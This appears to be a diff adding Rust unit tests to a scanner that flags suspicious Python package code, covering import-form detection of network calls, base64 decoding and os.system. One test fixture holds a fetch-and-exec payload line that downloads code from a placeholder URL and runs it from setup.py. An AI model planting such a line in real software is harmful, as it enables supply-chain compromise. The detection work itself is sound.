@@ -828,6 +828,103 @@ install:
         );
     }
 
+    /// `from X import Y` is ordinary Python, so a pattern that hard-requires the
+    /// module prefix misses it. A constructed credential exfiltrator used exactly
+    /// that to evade NET-002. These pin the import-line branch for the three rules
+    /// where the widening was measured to be worth its false-positive cost.
+    #[test]
+    fn from_import_forms_are_flagged() {
+        for (phase, rule, contents) in [
+            (
+                "network_exfil",
+                "NET-002",
+                "from urllib.request import urlopen",
+            ),
+            ("obfuscation", "OBFUSC-001", "from base64 import b64decode"),
+            ("code_patterns", "CODE-014", "from os import system"),
+            // Aliased. Pins the `[^\n#]*\b...\b` tail against a future
+            // "tighten to the exact import name" edit.
+            (
+                "network_exfil",
+                "NET-002",
+                "from urllib.request import urlopen as _u",
+            ),
+            (
+                "obfuscation",
+                "OBFUSC-001",
+                "from base64 import b64decode as _d",
+            ),
+            ("code_patterns", "CODE-014", "from os import system as _s"),
+        ] {
+            let packs = packs_for_phase(phase);
+            let findings = scan_file_with_packs(&packs, "pkg/mod.py", "mod.py", contents);
+            assert!(
+                has_rule(&findings, rule),
+                "{rule} missed `{contents}`; got {findings:?}"
+            );
+        }
+    }
+
+    /// The import branch must stay UNANCHORED. `2023-04-03-ai-solver-py-v1.0`
+    /// writes its stage-2 payload as a string on one physical line, and it is the
+    /// only sample in 844 whose verdict the widening moves — anchoring the pattern
+    /// to the start of a line drops it from HIGH back to MEDIUM.
+    #[test]
+    fn a_from_import_inside_a_payload_string_is_flagged() {
+        let contents = r#"_ttmp.write(b"""from urllib.request import urlopen as _u;exec(_u('https://x/raw').read())""")"#;
+        let packs = packs_for_phase("network_exfil");
+        let findings = scan_file_with_packs(&packs, "pkg/setup.py", "setup.py", contents);
+        assert!(
+            has_rule(&findings, "NET-002"),
+            "the import branch must not be line-anchored; got {findings:?}"
+        );
+    }
+
+    /// The call site itself is deliberately NOT matched. A `(?:^|[^.\w])urlopen\s*\(`
+    /// branch was measured and dropped: it added 135 findings across 43 clean
+    /// packages, 28 of them mislabelling a `def urlopen(` definition, flipped
+    /// `pypi-webencodings` LOW to MEDIUM by counting one benign import twice, and
+    /// caught zero additional malicious samples. Re-adding it should be a deliberate
+    /// act against a failing test, not a quiet regression.
+    ///
+    /// Note also that Rust's `regex` crate has no lookbehind: the natural
+    /// `(?<![.\w])urlopen\s*\(` spelling does not merely fail, it makes the rule
+    /// vanish from a `cargo build` that exits 0. `compiles_the_whole_embedded_corpus`
+    /// is what catches that, and it only runs under `cargo test`.
+    #[test]
+    fn a_bare_urlopen_call_site_is_not_flagged() {
+        let contents = "with urlopen(url) as resp:\n    body = resp.read()";
+        let packs = packs_for_phase("network_exfil");
+        let findings = scan_file_with_packs(&packs, "pkg/fetch.py", "fetch.py", contents);
+        assert!(
+            !has_rule(&findings, "NET-002"),
+            "the call-site branch was measured and dropped; got {findings:?}"
+        );
+    }
+
+    /// The original dotted branches must survive the widening — an edit that adds
+    /// the import form while dropping the module-prefixed one would trade one blind
+    /// spot for a worse one.
+    #[test]
+    fn dotted_forms_still_flagged_after_widening() {
+        for (phase, rule, contents) in [
+            (
+                "network_exfil",
+                "NET-002",
+                "data = urllib.request.urlopen(user_url).read()",
+            ),
+            ("obfuscation", "OBFUSC-001", "raw = base64.b64decode(blob)"),
+            ("code_patterns", "CODE-014", "os.system(\"id\")"),
+        ] {
+            let packs = packs_for_phase(phase);
+            let findings = scan_file_with_packs(&packs, "pkg/mod.py", "mod.py", contents);
+            assert!(
+                has_rule(&findings, rule),
+                "{rule} lost its dotted branch on `{contents}`; got {findings:?}"
+            );
+        }
+    }
+
     #[test]
     fn fp_net010_reviewed_dns_resolution_not_flagged() {
         let contents = r#"resolved = getaddrinfo(
